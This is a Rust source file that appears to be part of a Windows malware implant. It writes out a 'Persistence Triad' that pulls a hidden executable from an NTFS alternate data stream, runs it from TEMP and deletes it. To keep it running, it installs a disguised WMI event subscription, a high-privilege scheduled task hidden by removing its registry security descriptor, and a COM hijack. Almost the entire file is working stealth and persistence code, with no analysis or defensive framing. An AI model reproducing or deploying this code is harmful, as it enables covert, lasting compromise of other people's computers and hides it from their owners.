use std::process::Command;
use log::{info, warn};

fn get_extraction_cmd(ads_path: &str) -> String {
    let (path, stream) = match ads_path.rfind(':') {
        Some(idx) if idx > 1 => (&ads_path[..idx], &ads_path[idx+1..]),
        _ => (ads_path, ""),
    };

    
    format!(
        "powershell -WindowStyle Hidden -Command \"Get-Content -LiteralPath '{}' -Stream '{}' -Raw -Encoding Byte | Set-Content -Path $env:TEMP\\updater.exe -Encoding Byte -Force; Start-Process -FilePath $env:TEMP\\updater.exe -ArgumentList '--ghost'; Start-Sleep 1; Remove-Item $env:TEMP\\updater.exe -ErrorAction SilentlyContinue\"",
        path, stream
    )
}

pub fn apply_persistence_triad(ads_path: &str) {
    info!("[Stealth] Applying Persistence Triad...");
    setup_wmi_persistence(ads_path);
    setup_hidden_scheduled_task(ads_path);
    setup_com_hijacking(ads_path);
}

fn setup_wmi_persistence(ads_path: &str) {
    info!("[Stealth] Configuring WMI Persistence (Layer 1)...");

    let filter_name = "WindowsHealthMonitor";
    let query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360";
    
    let cmd = get_extraction_cmd(ads_path);
    // Escape quotes for WMI String? WMI uses "..." strings.
    // PwSh string literal: '...' or "...".
    // Since get_extraction_cmd uses ", we use ' for wrapper in WMI $Cmd.
    // 'powershell ... "..."'
    
    let ps_script = format!(r#"
$FilterName = "{}"
$ConsumerName = "HealthConsumer"

Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object {{ $_.Name -eq $FilterName }} | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object {{ $_.Name -eq $ConsumerName }} | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter -like "*$FilterName*" }} | Remove-WmiObject

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{{
    Name = $FilterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "{}"
}}

$Cmd = '{}' 

$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{{
    Name = $ConsumerName
    CommandLineTemplate = $Cmd
}}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{{
    Filter = $WMIEventFilter
    Consumer = $WMIEventConsumer
}}
"#, filter_name, query, cmd);

    run_powershell(&ps_script);
}

/// 2. Hidden Scheduled Task (Backup)
fn setup_hidden_scheduled_task(ads_path: &str) {
    info!("[Stealth] Configuring Hidden Scheduled Task (Layer 2)...");
    
    let task_name = "WindowsCacheCleanup";
    let raw_cmd = get_extraction_cmd(ads_path);
    
    // IMPORTANT: Escape quotes for CMD /TR argument
    let tr_cmd = raw_cmd.replace("\"", "\\\""); 
    
    let create_cmd = format!("schtasks /Create /F /TN {} /TR \"{}\" /SC ONIDLE /I 10 /RL HIGHEST", task_name, tr_cmd);
    
    match Command::new("cmd").args(&["/C", &create_cmd]).output() {
        Ok(_) => info!("[Stealth] Scheduled Task Created."),
        Err(e) => warn!("[Stealth] Task Creation Failed: {}", e),
    }
    
    let hide_script = format!(r#"
$Path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{}"
Remove-ItemProperty -Path $Path -Name "SD" -ErrorAction SilentlyContinue
Write-Host "Task Hidden"
"#, task_name);

    run_powershell(&hide_script);
}

fn setup_com_hijacking(ads_path: &str) {
    info!("[Stealth] Configuring COM Hijacking (Layer 3)...");
    
    let target_clsid = "{b5f8350b-0548-48b1-a6ee-88bd00b4a5da}"; 
    let cmd = get_extraction_cmd(ads_path);
    // Escape single quotes if any for PS wrapper
    let cmd_safe = cmd.replace("'", "''");
    
    let hijack_script = format!(r#"
$CLSID = "{}"
$Path = "HKCU:\Software\Classes\CLSID\$CLSID\LocalServer32"
New-Item -Path $Path -Force | Out-Null
Set-ItemProperty -Path $Path -Name "(Default)" -Value '{}'
"#, target_clsid, cmd_safe);

    run_powershell(&hijack_script);
}

fn run_powershell(script: &str) {
    match Command::new("powershell")
        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script])
        .output() 
    {
        Ok(o) => {
            if !o.status.success() {
                warn!("[Stealth] PS Execution Warning: {}", String::from_utf8_lossy(&o.stderr));
            }
        },
        Err(e) => warn!("[Stealth] PS Execution Failed: {}", e),
    }
}
